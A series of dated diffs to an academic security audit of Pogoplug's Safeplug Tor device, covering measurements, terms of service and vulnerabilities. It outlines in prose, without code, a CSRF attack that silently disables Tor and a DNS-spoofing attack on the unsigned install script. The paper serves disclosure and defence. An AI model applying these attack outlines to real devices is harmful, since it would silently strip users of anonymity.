+TODO: Talk about performance measurements - specifically to do more than 20 fetches and spread the fetches out over time to ensure different Tor circuits.
+Talk about privoxy vs tbb measurements - improvements.
+
 \section{Conclusion}

### 2014-07-09 foci/paper.tex
new plot for measurements, new edits

@@
 
-This software can be understood by explaining what happens when a user modifies the Safeplug settings page.
-JavaScript on the settings page generates a POST request to {\tt xspctrl}, which is a script running via CGI in Lighttpd.
+This software executes the proxying through Tor and ad-blocking functions via Tor and Privoxy, while the Lighttpd server allows users to modify settings via a JavaScript-generated POST request to a shell script, {\tt xspctrl}, running via CGI.
 The CGI handler copies a number of environment variables, and then forks and runs {\tt xspctrl} via {\tt execve} (in the constructed environment).
-{\tt xspctrl} is a shell script with a method for each settings change; these methods execute any necessary Safeplug binary files (go\_update, go\_upgrade, go\_sshd, or go\_updateexceptions) and then return a HTTP response.
+{\tt xspctrl} contains a method for each settings change; these methods execute any necessary Safeplug binary files (go\_update, go\_upgrade, go\_sshd, or go\_updateexceptions) and then return a HTTP response.
 
@@
 \subsection{Cookies}  
-While browsing the Internet in a fresh browser session, we used FourthParty, a plugin developed by Jonathan Mayer to collect information about cookies and other browsing data, to confirm the presence of first-party cookies~\cite{fourthparty}.
+While browsing the Internet in a fresh browser session, we used FourthParty, a plugin developed by Jonathan Mayer to collect information about cookies and other browsing data, to confirm the presence of first-party cookies~\cite{fourthparty, mayer2012third}.
 More interesting and damaging to the user's control over their anonymity would be third-party cookies because the user cannot remove those just by logging out.
@@
 If the latency of web requests using the Safeplug is noticeably longer than that of normal Internet use, users may be deterred from using the device.
-Similarly, if turning Tor on, but not ad-blocking, adds a significant time delay, the user may only turn on the ad-blocking feature (without Tor).
+Similarly, if turning Tor on adds a significant time delay, the user may only turn on the ad-blocking feature (without Tor).
 We recorded the time for a web request on the following settings:
@@
 The Safeplug has no validation or authentication on the settings page for these RPC calls, so any malicious party inside the home network can easily modify the settings.
-Unlike many home routers, there is no username/password combination necessary to access the settings page.
+Unlike many home routers that use a similar system for settings modification, there is no username/password combination necessary to access the settings page.
 A more technically advanced user could send the call directly to the RPC server.
@@
 \label{dnsspoof}
-An additional dangerous class of vulnerabilities comes from the lack of HTTPS rather than any kind of encrypted communication during the software update process.
+An additional dangerous class of vulnerabilities comes from the lack of HTTPS during the software update process.
 We discovered that the update script is downloaded via TCP from an IP address provided by the Pogoplug servers.
@@
 \section{Related Work}
-To our knowledge, there has been no other study analyzing the security of Pogoplug's Safeplug device.  However, there has been much prior research on Tor and fingerprinting.
+To our knowledge, there has been no other study analyzing the security of Pogoplug's Safeplug device.  However, there has been much prior research on Tor~\cite{tor} and fingerprinting.
 

### 2014-07-11 foci/paper.tex
updated performance measurement section and future work section, added citations

@@
 \title{\Large \bf Security Audit of Safeplug ``Tor in a Box''}
-%\author{
-% {\rm Anne Edmundson}\\
-% Princeton University
-% \and
-% {\rm Anna Kornfeld Simpson}\\
-% Princeton University
-% \and
-% {\rm Joshua Kroll}\\
-% Princeton University
-% \and
-% {\rm Edward Felten}\\
-% Princeton University
-%} % end author
+\author{
+ {\rm Anne Edmundson}\\
+ Princeton University
+ \and
+ {\rm Anna Kornfeld Simpson}\\
+ Princeton University
+ \and
+ {\rm Joshua Kroll}\\
+ Princeton University
+ \and
+ {\rm Edward Felten}\\
+ Princeton University
+} % end author
 
@@
 Table \ref{versions} shows the software used by the device, the corresponding version of the software, the date of that version's release, and if it is up to date as of May 2014.
-There are many known vulnerabilities in the pieces of software that are not up to date.
+There are many known vulnerabilities in the pieces of software that are not up to date~\cite{cve1, cve2, cve3}.
 
@@
 
-For each of the settings, we took 20 measurements [TODO: explain why only 20 measurements]; Figure~\ref{fig:latency2} shows the average time of a web request on each of the specified settings for three different web pages.
+For each of the settings, we took 20 measurements because we were confident this would give us enough data points that would span multiple Tor circuits; Figure~\ref{fig:latency2} shows the average time of a web request on each of the specified settings for three different web pages.
 When taking these measurements, we loaded the page, but did not scroll; in many cases more objects are loaded when scrolling down a page.
@@
 
-TODO: talk about variation within specific categories for each site.
+\begin{figure*}
+  \centering
+  \includegraphics[width=0.5\textwidth]{rangeanddistcocacola}
+  \caption{Web request time variation for www.coca-cola.com.}
+  \label{fig:boxandwhisker}
+\end{figure*}
+
+Figure~\ref{fig:boxandwhisker} displays the variation among fetch requests for each setting when fetching \url{www.coca-cola.com}.
+The greater variation for settings using Tor leads us to believe that more than one Tor circuit was used.
+Despite performing these fetches close in time, this variation shows that more than one Tor circuit was used, and therefore, we were not simply measuring the variation in Tor circuit performance.
 
@@
 This, in conjunction with the fact that the Tor Browser Bundle is free and is issued directly from The Tor Project, shows a convincing argument to use the Tor Browser Bundle in place of the Safeplug.
-
-TODO: mention caveat that we might just be seeing variation in circuit performance because close timing of fetches.
 
@@
 \section{Future Work}
-TODO: Talk about performance measurements - specifically to do more than 20 fetches and spread the fetches out over time to ensure different Tor circuits.
-Talk about privoxy vs tbb measurements - improvements.
+A more in-depth analysis of the performance of the Safeplug would be useful in the future.
+The performance of the Safeplug reflects it's usability, and would be helpful in determining the trade-offs of using the device.
+Additionally, a greater breadth of privacy measurements would cement Safeplug's position as a useful privacy-preserving technology, or a device that doesn't protect privacy as well as other tools.
 

### 2014-07-13 foci/paper.tex
edited privacy measurement section and fixed figures

@@
   \label{fig:latency2}
-\end{figure*}
+\end{figure}
 
-\begin{figure*}
+\begin{figure}
   \centering
@@
   \label{fig:boxandwhisker}
-\end{figure*}
+\end{figure}
 
@@
 The Tor Project has developed the Tor Browser Bundle, which is a free custom browser that uses Tor as well as other protection mechanisms to help preserve a user's privacy.
-The Tor Browser Bundle may be a better solution than the Safeplug if it has fewer privacy implications.
-The differentiating factor between the Safeplug and the Tor Browser Bundle is the use of Privoxy; in order to determine the effectiveness of the Safeplug in comparison to that of the Tor Browser Bundle, we must measure the value of Privoxy.
-We ran a measurement study of the privacy implications of the use of Firefox, Firefox with Privoxy, and the Tor Browser Bundle; our data was collected by running crawls on the Alexa Top 100 sites in each of the specified browsers~\cite{alexa}.
+A differentiating factor between the Safeplug and the Tor Browser Bundle is the use of Privoxy; in order to determine the effectiveness of the Safeplug in comparison to that of the Tor Browser Bundle, we must measure the value of Privoxy.
+We ran a privacy study on the use of Firefox, Firefox with Privoxy, and the Tor Browser Bundle; our data was collected by running crawls on the Alexa Top 100 sites in each of the specified browsers~\cite{alexa}.
 All browser configurations were modified with Pagestats \cite{pagestats} and Cookie Manager+ \cite{cookiemonster} to aggregate information about third party requests, JavaScript objects, flash objects, and third party cookies.
-Table \ref{tbb} shows the per page fraction of: third party domains accessed, JavaScript objects received from third parties, flash objects received from third parties, and cookies received from third parties.
+Because measuring privacy is a difficult task, we measured potential ways for a user's privacy to be compromised.
+First, we recorded how many third party domains were accessed per page; this is shown in the second column of Table \ref{tbb}.
+The third and fourth columns show the number of JavaScript objects and the number of Flash objects received from third parties per page, respectively.
+Lastly, we kept track of the number of third party cookies received per page, and this is seen in the last column.
 
@@
 \renewcommand{\arraystretch}{1.3}
-\caption{Privacy implications of using Firefox, Privoxy, or the Tor Browser Bundle; the numbers represent the fraction of the corresponding privacy implications per page.}
+\caption{Measurements of using Firefox, Privoxy, or the Tor Browser Bundle; the numbers represent the fraction of Third Party Domains accessed per page, Javascript objects received from third parties per page, the number of Flash objects received from third parties per page, and the number of third party cookies received per page.}
 \label{tbb}
@@
 
-It is clear that the Tor Browser Bundle had the fewest privacy implications in most categories.
+It is clear that the Tor Browser Bundle performed the best in most categories.
 The one category where Privoxy performed better than the Tor Browser Bundle is in the number of JavaScript objects received from third parties; this can be attributed to the fact that our measurements were taken using the default settings for the Tor Browser Bundle, which allows JavaScript~\cite{torproject}.

### 2014-07-14 foci/paper.tex
more edits

@@
  \and
- {\rm Joshua Kroll}\\
+ {\rm Joshua A. Kroll}\\
  Princeton University
  \and
- {\rm Edward Felten}\\
+ {\rm Edward W. Felten}\\
  Princeton University
@@
 \item Firefox, no Tor, no ad-blocking (traffic running through the Safeplug device)
-\item Firefox, Tor, no ad-blocking
-\item Firefox, Tor, ad-blocking
-\item Firefox, no Tor, ad-blocking
+\item Firefox, Tor, no ad-blocking (using the Safeplug device)
+\item Firefox, Tor, ad-blocking (using the Safeplug device)
+\item Firefox, no Tor, ad-blocking (using the Safeplug device)
 \item Tor Browser Bundle with Safeplug (all settings off)
-\item Tor Browser Bundle
+\item Tor Browser Bundle (no use of the Safeplug device)
 \end{itemize}
@@
 
+The average web request time for accessing \url{www.washingtonpost.com} is greatest on the same settings that the average web request time for \url{www.google.com} is the least.
+This setting did not include ad-blocking, and therefore \url{www.washingtonpost.com} had to render each ad (which it requested through Tor); \url{www.google.com} does not have any ads.
+
 \begin{figure}
@@
 Despite performing these fetches close in time, this variation shows that more than one Tor circuit was used, and therefore, we were not simply measuring the variation in Tor circuit performance.
-
-The average web request time for accessing \url{www.washingtonpost.com} is greatest on the same settings that the average web request time for \url{www.google.com} is the least.
-This setting did not include ad-blocking, and therefore \url{www.washingtonpost.com} had to render each ad (which it requested through Tor); \url{www.google.com} does not have any ads.
 
@@
 Because measuring privacy is a difficult task, we measured potential ways for a user's privacy to be compromised.
-First, we recorded how many third party domains were accessed per page; this is shown in the second column of Table \ref{tbb}.
-The third and fourth columns show the number of JavaScript objects and the number of Flash objects received from third parties per page, respectively.
-Lastly, we kept track of the number of third party cookies received per page, and this is seen in the last column.
+First, we recorded how many third party domains were accessed total (throughout the crawl); in addition, we recorded the total number of JavaScript and Flash objects received from third parties, as well as the total number of third party cookies received.
+We then found the on-average, per-page numbers corresponding to these measurements by dividing the totals by 100.
+These fractions are shown in Table~\ref{tbb}.
 
@@
 \renewcommand{\arraystretch}{1.3}
-\caption{Measurements of using Firefox, Privoxy, or the Tor Browser Bundle; the numbers represent the fraction of Third Party Domains accessed per page, Javascript objects received from third parties per page, the number of Flash objects received from third parties per page, and the number of third party cookies received per page.}
+\caption{Measurements of using Firefox, Privoxy, or the Tor Browser Bundle; the numbers represent the average number of Third Party Domains accessed per page, the average number of Javascript objects received from third parties per page, the average number of Flash objects received from third parties per page, and the average number of third party cookies received per page.}
 \label{tbb}
@@
 A more in-depth analysis of the performance of the Safeplug would be useful in the future.
-The performance of the Safeplug reflects it's usability, and would be helpful in determining the trade-offs of using the device.
-Additionally, a greater breadth of privacy measurements would cement Safeplug's position as a useful privacy-preserving technology, or a device that doesn't protect privacy as well as other tools.
+The performance of the Safeplug reflects its usability, and would be helpful in determining the trade-offs of using the device.
+Additionally, clearer privacy metrics are needed to help evaluate privacy-enhancing technologies, such as the Safeplug.
 

### 2014-07-15 foci/paper.tex
Minor edits

@@
 \section{Introduction}
-Privacy on the Internet is becoming increasingly important as users realize how vulnerable they are to surveillance and theft of their data.
+Privacy on the Internet is becoming increasingly important as users realize how vulnerable they are to tracking, surveillance, and theft of their data.
 A recent Pew study listed compromised emails/accounts, harassment, stolen Social Security Numbers, bank information, and credit card numbers as some of the results of online visibility; according to the study, 86\% of Internet users have tried to become more anonymous online~\cite{pew}.
@@
 
-In December of 2013, the cloud storage company, Pogoplug, released the Safeplug, which is a small box that plugs into a user's home router.
+In December 2013, the cloud storage company Pogoplug released the Safeplug, a small box that plugs into a user's home router.
 It claims to: conceal your identity, hide where you live, shield your surfing habits, and make you anonymous online by routing all traffic through Tor~\cite{safeplug}.
@@
 However, there are other technologies available that aim to provide the same functionality, such as the Tor Browser Bundle, which can be used free of charge.
-In order to determine if there is a market for the Safeplug, we measure the privacy implications between the different technologies.
+In order to determine if the Safeplug provides value to users, we measure the privacy implications between the different technologies.
 We show that there is little reason to use the Safeplug over the Tor Browser Bundle; in addition to the Tor network technology used in the Safeplug, the Tor Browser Bundle contains protections against tracking cookies and fingerprinting, making it an improvement over the privacy offerings of the Safeplug.
@@
 The last step was to modify the settings; this page is shown in Figure~\ref{fig:settings}.
-We can turn Tor on/off, turn ad-blocking on/off, and turn relay node ability on/off (and if on, an additional option appeared to allow the device to be an exit relay).
+We can turn Tor on/off, turn ad-blocking on/off, and turn Tor relay node ability on/off (and if on, an additional option appeared to allow the device to be an exit relay).
 Additionally, we can specify ``white-listed'' domains that will be connected to directly even if Tor is turned on, without going through the Tor network.
@@
 Although Safeplug has a warning about clearing cookies on their FAQ page, it only mentions clearing cookies after a browser session.
-Of greater concern would be tracking a user during their browser session from website to website; preventing this requires knowledge and constant vigilance from the user, or a browser that does not accept third-party cookies, such as the one provided in the Tor Browser Bundle.
+Of greater concern would be tracking a user during their browser session from website to website; preventing this requires knowledge and vigilance from the user, or a browser that does not accept third-party cookies, such as the one provided in the Tor Browser Bundle.
 
@@
 The latency of using the Safeplug with Firefox, Tor, and ad-blocking is comparable to that of using the Tor Browser Bundle.
-For all three web pages, the Tor Browser Bundle had slightly lower latency; the Tor Browser Bundle blocks scripts, and for web pages such as \url{www.coca-cola.com}, this provides a significant latency decrease.
+For all three web pages, the Tor Browser Bundle had slightly lower latency; the Tor Browser Bundle blocks scripts, and for web pages such as \url{www.coca-cola.com}, this provides a significant latency decrease and better protects privacy.
 This, in conjunction with the fact that the Tor Browser Bundle is free and is issued directly from The Tor Project, shows a convincing argument to use the Tor Browser Bundle in place of the Safeplug.
@@
 	\hline
-		Configuration & Third Party Domains & JavaScript & Flash & Cookies \\ \hline
+		Configuration & Third Party Domains & Third Party JavaScript & Third Party Flash & Third Party Cookies \\ \hline
 		Plain Firefox	& 0.64 & 0.01 & 0.01 & 0.88 \\ \hline
@@
 \item Once the user clicks the link and loads the malicious site, the correctly formatted POST request will be sent to every IP address in the ranges.  
-\item Tor is disabled silently.  The user must check or refresh her settings page to learn that Tor is off.  
+\item Tor is disabled silently.  The user must check or refresh her Safeplug settings page to learn that Tor is off.  
 \end{enumerate}
@@
 Ultimately, the structural concerns of the Safeplug ``Torifying proxy-in-a-box'' strategy indicate that this is problematic as a method for security and anonymity online.
-It is critical for Safeplug to correct their security errors, particularly the vulnerability to silently disable Tor, in order to protect customers who have already made use of the device, but users who are truly concerned about safety and anonymity online should make use of technologies directly from the Tor Project.
+It is critical for Safeplug to correct their security errors, particularly the vulnerability to silently disable Tor, in order to protect customers who have already made use of the device, but users who are truly concerned about safety and anonymity online would be better served by the Tor Browser Bundle.
 

### 2014-07-16 foci/paper.tex
Anna hopefully final edits. Particularly section 5.4

@@
 \label{tos}
-The TOS are never presented to the user: they aren't presented in the Safeplug package or shown during the activation process, and are only available through a small link at the bottom of the Safeplug website\cite{safeplug}.
+The Terms of Service (TOS) are never presented to the user: they aren't presented in the Safeplug package or shown during the activation process, and are only available through a small link at the bottom of the Safeplug website\cite{safeplug}.
 
@@
 \renewcommand{\arraystretch}{1.3}
-\caption{The platforms and browsers that the Safeplug settings page provides instructions for.}
-\label{table_example}
 \centering
@@
 	\end{tabular}
+\caption{The platforms and browsers that the Safeplug settings page provides instructions for.}
+\label{table_example}
 \end{table}
@@
   \includegraphics[width=.5\textwidth]{settings_with_exit}
-  \caption{Safeplug settings page.  The last button ``Allow Exit'' only appears if the relay option above has been turned on.}
+  \caption{Safeplug settings page.  The last button ``Allow Exits'' only appears if the relay option above has been turned on.}
   \label{fig:settings}
@@
 Although Safeplug has a warning about clearing cookies on their FAQ page, it only mentions clearing cookies after a browser session.
-Of greater concern would be tracking a user during their browser session from website to website; preventing this requires knowledge and vigilance from the user, or a browser that does not accept third-party cookies, such as the one provided in the Tor Browser Bundle.
+This does not prevent the tracking of a user during their browser session from website to website; preventing this requires knowledge and vigilance from the user, or a browser that does not accept third-party cookies, such as the one provided in the Tor Browser Bundle.
 
@@
 The Safeplug uses two primary technologies: Tor and Privoxy.
-The Tor Project has developed the Tor Browser Bundle, which is a free custom browser that uses Tor as well as other protection mechanisms to help preserve a user's privacy.
-A differentiating factor between the Safeplug and the Tor Browser Bundle is the use of Privoxy; in order to determine the effectiveness of the Safeplug in comparison to that of the Tor Browser Bundle, we must measure the value of Privoxy.
-We ran a privacy study on the use of Firefox, Firefox with Privoxy, and the Tor Browser Bundle; our data was collected by running crawls on the Alexa Top 100 sites in each of the specified browsers~\cite{alexa}.
+The Tor Project has developed the Tor Browser Bundle (TBB), which is a free custom browser that uses Tor as well as other protection mechanisms to help preserve a user's privacy.
+A differentiating factor between the Safeplug and the TBB is the use of Privoxy; in order to determine the effectiveness of the Safeplug in comparison to that of the Tor Browser Bundle, we must measure the value of Privoxy against the other features of the TBB.
+We ran a privacy study on the use of Firefox, Firefox with Privoxy, and the TBB; our data was collected by running crawls on the Alexa Top 100 sites in each of the specified browsers~\cite{alexa}.
 All browser configurations were modified with Pagestats \cite{pagestats} and Cookie Manager+ \cite{cookiemonster} to aggregate information about third party requests, JavaScript objects, flash objects, and third party cookies.
@@
 \renewcommand{\arraystretch}{1.3}
-\caption{Measurements of using Firefox, Privoxy, or the Tor Browser Bundle; the numbers represent the average number of Third Party Domains accessed per page, the average number of Javascript objects received from third parties per page, the average number of Flash objects received from third parties per page, and the average number of third party cookies received per page.}
-\label{tbb}
 \centering
@@
 	\end{tabular}
+\caption{Measurements of using Firefox, Privoxy, or the Tor Browser Bundle; the numbers represent the average number of Third Party Domains accessed per page, the average number of Javascript objects received from third parties per page, the average number of Flash objects received from third parties per page, and the average number of third party cookies received per page.}
+\label{tbb}
 \end{table}
@@
 
-\subsection{Spoofing the Update Server}
+\subsection{Spoofing the Installation Server}
 \label{dnsspoof}
-An additional dangerous class of vulnerabilities comes from the lack of HTTPS during the software update process.
-We discovered that the update script is downloaded via TCP from an IP address provided by the Pogoplug servers.
-This update script (run as root) then downloads the Safeplug's software (Tor, Privoxy, Lighttpd, and wget) and checks it against MD5 hashes, but it is not clear whether there is verification of the update script itself.
-An adversary could use DNS spoofing or compromise the Pogoplug server and force users to download a malicious update script - for example, something that turns the Safeplug into a surveillance box while appearing to provide the correct functionality.
-Because the activation occurs over TCP rather than anything more secure, an adversary who can spoof DNS replies to the user can install arbitrary software onto the Safeplug box.
+An additional dangerous class of vulnerabilities comes from the lack of HTTPS during the initial installation process.
+We discovered that the script that performs this installation is downloaded via TCP from an IP address provided by the Pogoplug servers.
+This script (run as root) then downloads the Safeplug's software (Tor, Privoxy, Lighttpd, and wget) and checks it against MD5 hashes, but it is not clear whether there is verification of the script itself.
+An adversary could use DNS spoofing or compromise the Pogoplug server and force users to download a malicious script - for example, something that turns the Safeplug into a surveillance box while appearing to provide the correct functionality.
+Because the activation occurs over TCP, an adversary who can spoof DNS replies to the user can install arbitrary software onto the Safeplug box.
 This turns a device that does not live up to expectations, but is otherwise harmless, into something that actively harms security on the network.
+Note: We were unable to observe a post-installation update from Pogoplug due to none being provided to users in the 6+ months since the Safeplug was released, but examining the update scripts on the Safeplug indicates that this update process DOES occur over HTTPS.
 
@@
 Despite all the structural problems, is there a market for a Torifying piece of hardware?
-Given the security pitfalls in comparison to a piece of software such as the Tor Browser Bundle, there seems to be no reason for a user who can run the Tor Browser Bundle to purchase the Safeplug or any other device.
+Given the security and privacy pitfalls in comparison to a piece of software such as the Tor Browser Bundle, there seems to be no reason for a user who can run the Tor Browser Bundle to purchase the Safeplug or any other device.
 For mobile phones, the proxy problems with mobility contribute to an already high usability cost.

### 2014-07-17 foci/paper.tex
added email addresses

@@
  {\rm Anne Edmundson}\\
- Princeton University
+ Princeton University\\
+ annee@cs.princeton.edu
  \and
  {\rm Anna Kornfeld Simpson}\\
- Princeton University
+ Princeton University\\
+ aksimpso@cs.princeton.edu
  \and
  {\rm Joshua A. Kroll}\\
- Princeton University
+ Princeton University\\
+ kroll@cs.princeton.edu
  \and
  {\rm Edward W. Felten}\\
- Princeton University
+ Princeton University\\
+ felten@cs.princeton.edu
 } % end author
@@
 \label{tos}
-The Terms of Service (TOS) are never presented to the user: they aren't presented in the Safeplug package or shown during the activation process, and are only available through a small link at the bottom of the Safeplug website\cite{safeplug}.
+The Terms of Service (TOS) are never presented to the user: they aren't presented in the Safeplug package or shown during the activation process, and are only available through a small link at the bottom of the Safeplug website~\cite{safeplug}.
 
@@
 A standard term of many open source licenses states that a company that uses the open source software must list the software used and its license, as well as the open source code of their own software that uses the license.
-The TOS contains a link to a page that would supposedly comply with this requirement: \url{http://pogoplug.com/home-en-developers-open-source.html} but the link is dead; instead, the reader sees a 404 error \cite{safeplug}.
+The TOS contains a link to a page that would supposedly comply with this requirement: \url{http://pogoplug.com/home-en-developers-open-source.html}, but the link is dead; instead, the reader sees a 404 error \cite{safeplug}.
 There is an open source page at \url{http://pogoplug.com/opensource}, which describes several pieces of software used by the Safeplug; however, there is no way to find this page from the Terms of Service or the Safeplug website.
@@
 Figure~\ref{fig:boxandwhisker} displays the variation among fetch requests for each setting when fetching \url{www.coca-cola.com}.
-The greater variation for settings using Tor leads us to believe that more than one Tor circuit was used.
-Despite performing these fetches close in time, this variation shows that more than one Tor circuit was used, and therefore, we were not simply measuring the variation in Tor circuit performance.
+Despite performing these fetches close in time, the greater variation for settings using Tor shows that more than one Tor circuit was used, and therefore, we were not simply measuring the variation in Tor circuit performance.
 
@@
 The Tor Project has developed the Tor Browser Bundle (TBB), which is a free custom browser that uses Tor as well as other protection mechanisms to help preserve a user's privacy.
-A differentiating factor between the Safeplug and the TBB is the use of Privoxy; in order to determine the effectiveness of the Safeplug in comparison to that of the Tor Browser Bundle, we must measure the value of Privoxy against the other features of the TBB.
+A differentiating factor between the Safeplug and the TBB is the use of Privoxy; in order to determine the effectiveness of the Safeplug in comparison to that of the TBB, we must measure the value of Privoxy against the other features of the TBB.
 We ran a privacy study on the use of Firefox, Firefox with Privoxy, and the TBB; our data was collected by running crawls on the Alexa Top 100 sites in each of the specified browsers~\cite{alexa}.
@@
 This turns a device that does not live up to expectations, but is otherwise harmless, into something that actively harms security on the network.
-Note: We were unable to observe a post-installation update from Pogoplug due to none being provided to users in the 6+ months since the Safeplug was released, but examining the update scripts on the Safeplug indicates that this update process DOES occur over HTTPS.
+We were unable to observe a post-installation update from Pogoplug due to none being provided to users in the 6+ months since the Safeplug was released, but examining the update scripts on the Safeplug indicates that this update process occurs over HTTPS.
 

### 2014-07-17 foci/paper.tex
Add a clause for clarity

@@
 This turns a device that does not live up to expectations, but is otherwise harmless, into something that actively harms security on the network.
-We were unable to observe a post-installation update from Pogoplug due to none being provided to users in the 6+ months since the Safeplug was released, but examining the update scripts on the Safeplug indicates that this update process occurs over HTTPS.
+We were unable to observe a post-installation update from Pogoplug due to none being provided to users in the 6+ months since the Safeplug was released, but examining the update scripts on the Safeplug indicates that this update process occurs over HTTPS, so that only the initial download during device activation is vulnerable.
 

### 2014-07-17 foci/paper.tex
Strengthen the section on initialization and upgrades.

@@
 We discovered that the script that performs this installation is downloaded via TCP from an IP address provided by the Pogoplug servers.
-This script (run as root) then downloads the Safeplug's software (Tor, Privoxy, Lighttpd, and wget) and checks it against MD5 hashes, but it is not clear whether there is verification of the script itself.
+This script (run as root) then downloads the Safeplug's software (Tor, Privoxy, Lighttpd, and wget) and checks it against MD5 hashes provided in the script, but we could not find any signs of verification of the script itself.
 An adversary could use DNS spoofing or compromise the Pogoplug server and force users to download a malicious script - for example, something that turns the Safeplug into a surveillance box while appearing to provide the correct functionality.
-Because the activation occurs over TCP, an adversary who can spoof DNS replies to the user can install arbitrary software onto the Safeplug box.
+Because the activation occurs over TCP in the clear, an adversary who can spoof DNS replies to the user can install arbitrary software onto the Safeplug box.
 This turns a device that does not live up to expectations, but is otherwise harmless, into something that actively harms security on the network.
 We were unable to observe a post-installation update from Pogoplug due to none being provided to users in the 6+ months since the Safeplug was released, but examining the update scripts on the Safeplug indicates that this update process occurs over HTTPS, so that only the initial download during device activation is vulnerable.
+However, DNS spoofing would still defeat the authentication of update binaries provided by HTTPS.
+In short, Pogoplug should be signing both the code used in updates and the code downloaded during the initial installation with a key whose corresponding verification key is part of the device's factory image.
+Pogoplug already provides several certificates in the factory image to establish roots of trust, so it would be a minimal engineering effort to include their own update-signing certificate.\footnote{N.B.
+There could be such a certificate already on the device that we haven't found.
+Because there have been no updates, we cannot determine whether signatures are present on the update code.
+We hypothesize that they would not be present, based on the fact that they were not present in the downloads for device initiation.}
 
@@
 Although someone doing a CSRF attack such as the one described above could get the cookie sent, because of the same-origin policy, the adversary would not be able to examine the contents of the cookie to determine what to put in the form field.
+Pogoplug should also take steps to secure
 
